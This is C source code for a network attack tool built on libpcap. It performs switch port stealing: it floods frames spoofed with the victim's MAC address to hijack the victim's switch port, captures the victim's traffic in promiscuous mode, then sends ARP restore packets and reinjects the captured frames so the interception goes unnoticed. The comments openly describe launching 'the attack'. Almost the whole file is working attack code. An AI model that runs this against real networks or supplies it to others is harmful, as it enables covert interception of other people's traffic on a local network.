/*
 * hexinject.h
 *
 *  Created on: 26/oct/2012
 *      Author: Acri Emanuele
 */

#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <getopt.h>
#include <assert.h>
#include <arpa/inet.h>
#include <signal.h>

#include "argparser.h"
#include "hexinject.h"

/* Global variable used to signalate the termination */
int exitnow = 0;

/*
 * Signal handler (to terminate the program in a clean way)
 */
void handler(int signum) {
    exitnow++;
}

/*
 * Prepare ARP packet used to restore the correct victim_mac/switch_port
 * association in the switch CAM table.
 */
char *prepare_restore_packet(char *victim_ip, char *our_ip, char *our_mac) {
    static char restore_packet[] = "FF FF FF FF FF FF " // destination broadcast
                                   "00 00 00 00 00 00 " // source
                                   "08 06 "
                                   "00 01 "
                                   "08 00 "
                                   "06 "
                                   "04 "
                                   "00 01 "
                                   "00 00 00 00 00 00 " // sender mac
                                   "00 00 00 00 "       // sender ip
                                   "00 00 00 00 00 00 " // target mac
                                   "00 00 00 00";       // victim ip

    in_addr_t ip;
    uint8_t *byte;

    char hex_ip[32];

    int i;

    char *hex_mac = strdup(our_mac);

    // set our mac

    for(i=0; i < strlen(hex_mac); i++) if (hex_mac[i] == ':') hex_mac[i] = ' ';

    memcpy(restore_packet + 18, hex_mac, strlen(hex_mac));
    memcpy(restore_packet + 66, hex_mac, strlen(hex_mac));    

    free(hex_mac);

    // set our ip
    
    ip = inet_addr(our_ip);
    byte = (uint8_t *) &ip;
    
    snprintf(hex_ip, sizeof(hex_ip)-1, "%02X %02X %02X %02X", byte[0], byte[1], byte[2], byte[3]);

    memcpy(restore_packet + 84, hex_ip, strlen(hex_ip));

    // set victim ip

    ip = inet_addr(victim_ip);
    byte = (uint8_t *) &ip;

    snprintf(hex_ip, sizeof(hex_ip)-1, "%02X %02X %02X %02X", byte[0], byte[1], byte[2], byte[3]);

    memcpy(restore_packet + 114, hex_ip, strlen(hex_ip));

    return restore_packet;
}

/*
 * Prepare DNS packet (of course you can use other kind of packets) used to
 * "steal" the victim port in the switch CAM table.
 */
char *prepare_steal_packet(char *victim_mac, char *our_mac) {

    static char dns_packet[] = "00 00 00 00 00 00 " // our mac
                               "00 00 00 00 00 00 " // victim mac
                               "08 00 45 00 00 3C 9B 23 00 00 40 11 70 BC C0 A8 "
                               "01 09 D0 43 DC DC 91 02 00 35 00 28 6F 0B AE 9C "
                               "01 00 00 01 00 00 00 00 00 00 03 77 77 77 06 67 "
                               "6F 6F 67 6C 65 03 63 6F 6D 00 00 01 00 01";

    int i;

    char *hex_mac = strdup(our_mac);
    for(i=0; i < strlen(hex_mac); i++) if (hex_mac[i] == ':') hex_mac[i] = ' ';

    // set our mac
    memcpy(dns_packet, hex_mac, strlen(hex_mac));

    free(hex_mac);

    hex_mac = strdup(victim_mac);
    for(i=0; i < strlen(hex_mac); i++) if (hex_mac[i] == ':') hex_mac[i] = ' ';

    // set victim mac
    memcpy(dns_packet + 18, hex_mac, strlen(hex_mac));

    free(hex_mac);

    return dns_packet;  
}

/*
 * Reinject stealed packets
 */
int reinject_loop(pcap_t *fp, int verbosity, int pretty_print, int no_cksum, int no_size)
{
    char *packet;
    size_t size;

    char *hexstr;

    /*
     * We reinject packets captured until now, changing their
     * source mac address to FF:FF:FF:FF:FF:FF.
     *
     * Pcap maintain the queue for us, so it's easy...
     */
    while ((packet = sniff_raw(fp, &size))) {

        hexstr = raw_to_hexstr(packet, size); // convert to hexadecimal string
            
        /* Print debug data */
        if(pretty_print) {
            layer_2_dispatcher(packet, size, 0);
            puts("\n ----------- ");
        }
        else if(verbosity) {
            if      (verbosity == 1) putc('.', stdout);
            else if (verbosity >= 2) printf("%s\n", hexstr);
            fflush(stdout);
        }

        /* Modify the packet */
        memcpy(hexstr + 18, "00 00 00 00 00 00", 17); // replace src mac with broadcast

        /* Pass the packet to the external command */
        // TODO: maybe we can implement a way to use an
        // external command to modify/analyze the packet (just an idea...)

        /* Reinject the packet */
        if (inject_hexstr(fp, hexstr, no_cksum, no_size) != 0) {
            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
            return 1;
        }

        free(hexstr); 

        usleep(1000);
    }

    return 0;
}

/*
 * Port stealing loop
 */
int steal_port_loop(pcap_t *fp, int sleep_time, char *victim_ip, char *victim_mac,
                    char *our_ip, char *our_mac, int verbosity, int pretty_print,
                    int no_cksum, int no_size)
{
    char *steal_packet, *restore_packet;

    int ret_val = 0;

    // prepare packets to inject
    steal_packet = prepare_steal_packet(victim_mac, our_mac);
    restore_packet = prepare_restore_packet(victim_ip, our_ip, our_mac);

    while ( exitnow == 0 && ret_val == 0  ) { // port steal

        /* Steal port */
        if (inject_hexstr(fp, steal_packet, no_cksum, no_size) != 0) {
            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
            ret_val=1;
        }

        /* Wait to capture something */
        usleep(sleep_time);
    
        /* Port restore */
        if (inject_hexstr(fp, restore_packet, no_cksum, no_size) != 0) {
            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
            ret_val=1;
        }

        /* Wait for correct forwarding */
        usleep(sleep_time);

        /* Re-forward captured packets */
        ret_val = reinject_loop(fp, verbosity, pretty_print, no_cksum, no_size);

        /* Wait for correct forwarding */
        usleep(sleep_time);
    }
    
    // port restore
    if (inject_hexstr(fp, restore_packet, no_cksum, no_size) != 0) {
        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
        ret_val=1;
    }

    return ret_val;
}

/*
 * Main function
 */
int main(int argc, char **argv) {

    pcap_t *fp;
    pcap_if_t *alldevsp;
    struct bpf_program bpf;

    char errbuf[PCAP_ERRBUF_SIZE];
    char pcap_filter[256];

    char *dev=NULL;
     
    /* Parse cmdline options */
    parseopt(argc, argv);
    
    /*
     * PREPARATION
     *
     * In this part of the program we prepare a pcap socket to
     * capture and inject raw data to the network
     */

    /* in case of device listing */
    if(options.list_devices) {
        if(pcap_findalldevs(&alldevsp, errbuf) != 0) {
            fprintf(stderr,"Unable to list devices: %s.\n", errbuf);
            return 1;
        }
        for (; alldevsp; alldevsp=alldevsp->next) {
            printf("%s", alldevsp->name);
            if (alldevsp->description != NULL)
                printf(" (%s)", alldevsp->description);
            printf("\n");
        }
        return 0;
    }
    
    /* Find a device if not specified */
    if(!options.device) {
        dev = pcap_lookupdev(errbuf);
        if (dev == NULL) {
            fprintf(stderr,"Unable to find a network adapter: %s.\n", errbuf);
            return 1;
        }
    }
    else {
        dev = options.device;
    }

    /* Create packet capture handle */
    if((fp = pcap_create(dev, errbuf)) == NULL) {
        fprintf(stderr,"Unable to create pcap handle: %s\n", errbuf);
        return 1;
    }

    /* Set snapshot length */
    if(pcap_set_snaplen(fp, BUFSIZ) != 0) {
        fprintf(stderr,"Unable to set snapshot length: the interface may be already activated\n");
        return 1;
    }

    /* Set promiscuous mode */
    if(pcap_set_promisc(fp, 1) != 0) {
        fprintf(stderr,"Unable to set promiscuous mode: the interface may be already activated\n");
        return 1;
    }

    /* Set read timeout */
    if(pcap_set_timeout(fp, 1000) != 0) { // a little patch i've seen in freebsd ports: thank you guys ;)
        fprintf(stderr,"Unable to set read timeout: the interface may be already activated\n");
        return 1;
    }

    /* Activate interface */
    if(pcap_activate(fp) != 0) {
        fprintf(stderr, "Unable to activate the interface: %s\n", pcap_geterr(fp));
        return 1;
    }
    
    /* Apply filter */   
    snprintf(pcap_filter, sizeof(pcap_filter) - 1, "ether dst host %s", options.victim_mac);

    if(pcap_compile(fp, &bpf, pcap_filter, 0, 0) != 0) {
        fprintf(stderr, "Error compiling filter \"%s\": %s\n", pcap_filter, pcap_geterr(fp));
        return 1;
    }

    if(pcap_setfilter(fp, &bpf) != 0) {
        fprintf(stderr, "Error setting filter: %s\n", pcap_geterr(fp));
        return 1;
    }

    /*
     * PREPARATION COMPLETED
     *
     * Now it's possible to launch the attack.
     */

    /* Register the signal handler */
    signal(SIGTERM, &handler);
    signal(SIGINT, &handler);
    
    /* Run attack loop */
    steal_port_loop(fp,
                    options.sleep_time,
                    options.victim_ip,
                    options.victim_mac,
                    options.our_ip,
                    options.our_mac,
                    options.verbosity,
                    options.print_dis,
                    options.no_cksum,
                    options.no_size);

    // cleanup
    pcap_close(fp);

    return 0;
}
